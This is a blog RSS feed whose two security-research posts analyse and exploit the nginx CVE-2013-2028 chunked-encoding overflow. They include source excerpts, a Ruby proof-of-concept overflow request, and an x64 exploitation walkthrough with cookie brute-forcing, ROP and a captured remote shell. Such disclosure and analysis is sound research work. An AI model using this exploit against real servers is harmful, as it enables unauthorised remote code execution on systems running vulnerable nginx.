<?xml version="1.0" encoding="UTF-8" ?>

<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
   
   	<title>RealJenius.com - Tag: cve-2013-2028</title>
   
   <link>http://realjenius.com</link>
   <description>I'm a software developer in the game industry, and have been (for better or worse) coding on the Java platform for the last decade. I also do all my own stunts.</description>
   <language>en-us</language>
   <managingEditor>R.J. Lorimer</managingEditor>
   <atom:link href="rss" rel="self" type="application/rss+xml" />
   
	<item>
  <title>Exploiting nginx chunked overflow bug, the undisclosed attack vector (CVE-2013-2028)</title>
  <link>http://realjenius.com/research/2013/07/17/exploiting-nginx-chunked-overflow-bug-the-undisclosed-attack-vector-cve-2013-2028.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2013-07-17T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/research/2013/07/17/exploiting-nginx-chunked-overflow-bug-the-undisclosed-attack-vector-cve-2013-2028.html</guid>
  <description><![CDATA[
     <p>In <a href="http://www.vnsecurity.net/2013/05/analysis-of-nginx-cve-2013-2028/">previous post</a>, we analyzed and exploited stack based buffer overflow vulnerability in chunked encoding parsing of nginx-1.3.9 – 1.4.0. We mentioned that there was another attack vector which was more practical, more reliable. I talked about this attack vector at <a href="http://www.secuinside.com">SECUINSIDE</a> 2013 in July (btw, a great conference and CTF). Details can be found in <a href="http://ropshell.com/slides/Nginx_chunked_overflow_the_undisclosed_attack_vector.pdf">slides</a>.</p>

<p>In summary:</p>

<ul>
  <li>Same <a href="http://www.vnsecurity.net/2013/05/analysis-of-nginx-cve-2013-2028/">bug</a> with different code paths that serve dynamic contents via fastcgi, proxy backend, etc. These configurations are more practical in real world environments.</li>
  <li>Heap based overflow instead of stack based overflow as described in the original advisory. Nothing to worry about stack cookie (so no bruteforcing).</li>
  <li>The trick to make heap overflow exploit more reliable is via connection spraying.</li>
  <li>Some small tips and tricks for ROP and shellcode.</li>
</ul>

<p>Enjoy hacking!</p>


  ]]></description>
</item>

	<item>
  <title>Analysis of nginx 1.3.9/1.4.0 stack buffer overflow and x64 exploitation (CVE-2013-2028)</title>
  <link>http://realjenius.com/research/2013/05/21/analysis-of-nginx-cve-2013-2028.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2013-05-21T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/research/2013/05/21/analysis-of-nginx-cve-2013-2028.html</guid>
  <description><![CDATA[
     <p>A few days after the release of nginx advisory (<a href="http://mailman.nginx.org/pipermail/nginx-announce/2013/000112.html" target="_blank">CVE-2013-2028</a>), we managed to successfully exploit the vulnerability with a full control over the program flow. However, in order to make it more reliable and useful in real world environment, we still explored several program paths and found some other attack vectors. Since the exploit for Nginx 32-bit is available on <a href="https://github.com/rapid7/metasploit-framework/pull/1834" target="_blank">Metasploit</a> now, we decide to publish some of our works here. In this post, you will find a quick analysis for the vulnerability and an exploitation for a 64-bit linux server using the stack based overflow attack vector.</p>

<h3 id="the-bug">The Bug</h3>

<p>Based on <a href="http://nginx.org/download/patch.2013.chunked.txt" target="_blank">the patch</a> on nginx.org, there is a code path that leads to a stack based overflow vulnerability, related to 03 different nginx components:</p>

<p><strong>1) The calculation of “chunked size”</strong> when someone send a http request with the header: “Transfer-Encoding: chunked”. It is calculated at <a href="https://github.com/danghvu/nginx-1.4.0/blob/master/src/http/ngx_http_parse.c#L2011" target="_blank">src/http/ngx_http_parse.c:2011</a></p>

<pre class="brush: cpp; title: ; notranslate" title="">if (ch &gt;= '0' &amp;&amp; ch &lt;= '9') {   ctx-&gt;size = ctx-&gt;size * 16 + (ch - '0');
  break;
}
c = (u_char) (ch | 0x20);
if (c &gt;= 'a' &amp;&amp; c &lt;= 'f') {   ctx-&gt;size = ctx-&gt;size * 16 + (c - 'a' + 10);
  break;
}
</pre>

<p>It simply parses the chunked size input as hex and convert it to base of 10. And since ctx-&gt;size is defined with size_t, an unsigned type, the value of the variable can be misinterpreted as negative number when casting to signed type, as we will see later.</p>

<p><strong>2) Nginx module when serving static file:</strong></p>

<p>When nginx is setup to serve static file (which is the default setting), ngx_http_static_handler in <a href="https://github.com/danghvu/nginx-1.4.0/blob/master/src/http/modules/ngx_http_static_module.c#L49" target="_blank">src/http/modules/ngx_http_static_module.c:49</a> will be executed when receiving a request.</p>

<p>ngx_http_static_handler will then call ngx_http_discard_request_body at <a href="https://github.com/danghvu/nginx-1.4.0/blob/master/src/http/modules/ngx_http_static_module.c#L211" target="_blank">src/http/modules/ngx_http_static_module.c:211</a>.</p>

<p>ngx_http_discard_request_body will then call ngx_http_read_discarded_request_body at <a href="https://github.com/danghvu/nginx-1.4.0/blob/master/src/http/ngx_http_request_body.c#L526" target="_blank">src/http/ngx_http_request_body.c:526</a>.</p>

<p><em>In summary the code path: ngx_http_static_handler-&gt;ngx_http_discard_request_body-&gt;ngx_http_read_discarded_request_body</em></p>

<p>ngx_http_read_discarded_request_body is where it gets interesting, we can see a buffer with fixed size is defined at <a href="https://github.com/danghvu/nginx-1.4.0/blob/master/src/http/ngx_http_request_body.c#L630" target="_blank">src/http/ngx_http_request_body.c:630</a> as follows:</p>

<pre class="brush: cpp; title: ; notranslate" title="">static ngx_int_t
ngx_http_read_discarded_request_body(ngx_http_request_t *r)
{
    size_t     size;
    ssize_t    n;
    ngx_int_t  rc;
    ngx_buf_t  b;
    u_char     buffer[NGX_HTTP_DISCARD_BUFFER_SIZE];
</pre>

<p>NGX_HTTP_DISCARD_BUFFER_SIZE is defined as 4096 in <a href="https://github.com/danghvu/nginx-1.4.0/blob/master/src/http/ngx_http_request.h#L19" target="_blank">src/http/ngx_http_request.h:19 </a></p>

<p>The interesting is at how this buffer is filled at <a href="https://github.com/danghvu/nginx-1.4.0/blob/master/src/http/ngx_http_request_body.c#L649" target="_blank">src/http/ngx_http_request_body.c:649</a> that we shall use later in (3)</p>

<pre class="brush: cpp; title: ; notranslate" title="">size = (size_t) ngx_min(r-&gt;headers_in.content_length_n, NGX_HTTP_DISCARD_BUFFER_SIZE);
n = r-&gt;connection-&gt;recv(r-&gt;connection, buffer, size);
</pre>

<p><strong>3) The state transition when parsing http request</strong></p>

<p>Come back to <a href="https://github.com/danghvu/nginx-1.4.0/blob/master/src/http/ngx_http_request_body.c" target="_blank">src/http/ngx_http_request_body.c</a>, before calling ngx_http_read_discarded_request_body, nginx <a href="https://github.com/danghvu/nginx-1.4.0/blob/master/src/http/ngx_http_request_body.c#L514" target="_blank">check whether we have a “chunked” type of request</a>, it will then run ngx_http_discard_request_body_filter defined in <a href="https://github.com/danghvu/nginx-1.4.0/blob/master/src/http/ngx_http_request_body.c#L680" target="_blank">src/http/ngx_http_request_body.c:680</a>.</p>

<p>ngx_http_discard_request_body_filter will execute <a href="https://github.com/danghvu/nginx-1.4.0/blob/master/src/http/ngx_http_request_body.c#L707" target="_blank">ngx_http_parse_chunked</a> which is the code we mentioned in (1). After that, the return value in “rc” is checked with some constant to decide the next move. One of them is particularly very interesting.</p>

<pre class="brush: cpp; title: ; notranslate" title="">if (rc == NGX_AGAIN) {
     /* set amount of data we want to see next time */
     r-&gt;headers_in.content_length_n = rb-&gt;chunked-&gt;length;
     break;
}
</pre>

<p>**Suppose we can set rb-&gt;chunked-&gt;length as a very large number at (1), and then set rc = NGX_AGAIN at (3), following events will happen:<br />
**</p>

<ul>
  <li>
    <p>r-&gt;headers_in.content_length_n is set to negative ( as it is defined with `off_t` which is <a href="http://www.gnu.org/software/libc/manual/html_mono/libc.html" target="_blank">“a signed integer”</a> type.).</p>
  </li>
  <li>
    <p>The function ngx_http_discard_request_body_filter return and the program move to execute <a href="https://github.com/danghvu/nginx-1.4.0/blob/master/src/http/ngx_http_request_body.c#L526" target="_blank">ngx_http_read_discarded_request_body</a>. which contains our vulnerable buffer.</p>
  </li>
  <li>
    <p>Finally the recv() command is tricked to receive more than 4096 bytes and overflow the buffer on the stack.</p>
  </li>
</ul>

<p>There are many ways to set chunked-&gt;length, since rb-&gt;chunked-&gt;length is assigned at the end of ngx_http_parse_chunked function based on the rb-&gt;chunked-&gt;size that we have a direct control.</p>

<pre class="brush: cpp; title: ; notranslate" title="">switch (state) {
case sw_chunk_start:
	ctx-&gt;length = 3 /* "0" LF LF */;
break;
	case sw_chunk_size:
ctx-&gt;length = 2 /* LF LF */
              + (ctx-&gt;size ? ctx-&gt;size + 4 /* LF "0" LF LF */ : 0);
</pre>

<p>To make rc = NGX_AGAIN, we realize that for a request nginx makes the first recv with 1024 bytes, so if we send more than 1024 bytes ngx_http_parse_chunked will return with a NGX_AGAIN then when nginx tries to recv again it will be right into our setup.</p>

<p>**The payload to overflow the stack buffer is as follows: **</p>

<ul>
  <li>
    <p>Send http request with a “transfer-encoding: chunked”</p>
  </li>
  <li>
    <p>Send a large hexadecimal number to fill the entire 1024 bytes of the first read</p>
  </li>
  <li>
    <p>Send &gt; 4096 bytes to overflow the buffer when it try to recv the second times</p>
  </li>
</ul>

<p><strong>TL;DR ?</strong> Here is the proof of concept for x64</p>

<pre class="brush: ruby; title: ; notranslate" title="">require 'ronin'
tcp_connect(ARGV[0],ARGV[1].to_i) { |s|
    payload = ["GET / HTTP/1.1rn",
            "Host: 1337.vnsecurity.netrn",
            "Accept: */*rn",
            "Transfer-Encoding: chunkedrnrn"].join
    payload &lt;&lt; "f"*(1024-payload.length-8) + "0f0f0f0f" #chunked
    payload &lt;&lt; "A"*(4096+8) #padding
    payload &lt;&lt; "C"*8 #cookie
    s.send(payload, 0)
}
</pre>

<p>strace output at the other end:</p>

<pre class="brush: plain; title: ; notranslate" title="">strace -p 11337 -s 5000 2&gt;&amp;1 | grep recv
recvfrom(3, "GET / HTTP/1.1rnHost: 1337.vnsecurity.netrnAccept: */*rnTransfer-Encoding: chunkedrnrnfff...snip..fff0f0f0f0f", 1024, 0, NULL, NULL) = 1024
recvfrom(3, "AAA..snip..AACCCCCCCC", 18446744069667229461, 0, NULL, NULL) = 4112
</pre>

<h3 id="exploitation-on-x64">Exploitation on x64:</h3>

<p>The problem of stack cookie/carnary can be overcome easily by brute-forcing byte by byte. If we send an extra byte and a worker process crashes, it will return nothing thus we know our cookie value is wrong, we try another value until we receive some output.</p>

<p>Then we need to bypass ASLR and DEP. The exploitation for 32-bit in the metasploit module won’t work, since it will bruteforce the libc address and it’s not feasible given the large address space in x64.</p>

<p>We give an exploit that only relies on the binary i.e. we build the ROP gadget from the binary. mprotect address is computed from mmap64 address (in the GOT-table) then use to allocate a writable-executable memory chunked. Then we use some ROP gadgets to copy our shellcode and have it executed by return to it finally.</p>

<p>TL;DR full exploit code could be find <a href="https://github.com/danghvu/nginx-1.4.0/blob/master/exp-nginx.rb" target="_blank">here</a></p>

<pre class="brush: plain; title: ; notranslate" title="">ruby exp-nginx.rb 1.2.3.4 4321
[+] searching for byte: 1
214
[+] searching for byte: 2
102
[+] searching for byte: 3
232
[+] searching for byte: 4
213
[+] searching for byte: 5
103
[+] searching for byte: 6
151
[+] searching for byte: 7
45
Found cookie: x00xd6x66xe8xd5x67x97x2d 8
PRESS ENTER TO GIVE THE SHIT TO THE HOLE AT w.w.w.w 4000
1120 connections
</pre>

<p><em>At w.w.w.w</em></p>

<pre class="brush: plain; title: ; notranslate" title="">nc -lvvv 4000
Connection from 1.2.3.4 port 4000 [tcp/*] accepted
uname -a
Linux ip-10-80-253-191 3.2.0-40-virtual #64-Ubuntu SMP Mon Mar 25 21:42:18 UTC 2013 x86_64 x86_64 x86_64 GNU/Linux
id
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),110(netdev),111(admin)
ps aux | grep nginx
ubuntu    2920  0.1  0.0  13920   668 ?        Ss   15:11   0:01 nginx: master process ./sbin/nginx
ubuntu    5037  0.0  0.0  14316  1024 ?        S    15:20   0:00 nginx: worker process
ubuntu    5039  0.0  0.0  14316  1024 ?        S    15:20   0:00 nginx: worker process
ubuntu    5041  0.0  0.0  14316  1024 ?        S    15:20   0:00 nginx: worker process
</pre>

<h3 id="reliable-exploitation">Reliable exploitation</h3>

<p>There are some reasons that the above exploitation/technique may not work in practice:</p>

<p>1) Nginx uses non-blocking recv(). If we can’t send enough data to overwrite the return address/cookie the exploit will fail. This is mostly the case since the normal server will be loaded with requests from different user.</p>

<p>2) Our analysis here is for the default setting of nginx, the code path can be very different with another setting thus making the exploit somewhat useless.</p>

<p>3) A blind attack is difficult without the knowledge of the binary / OS at the remote server. For 32-bit OS, one may further bruteforce the “write” address in the code space in order to leak information but It will still be unreliable due to the unknown sockfd and will fail for PIE.</p>

<p>Trying to make this more practical in real world environments, we actually found another attack vector which is more reliable and worked on several nginx settings. However, we will keep it for another post.</p>

  ]]></description>
</item>

</channel>
</rss>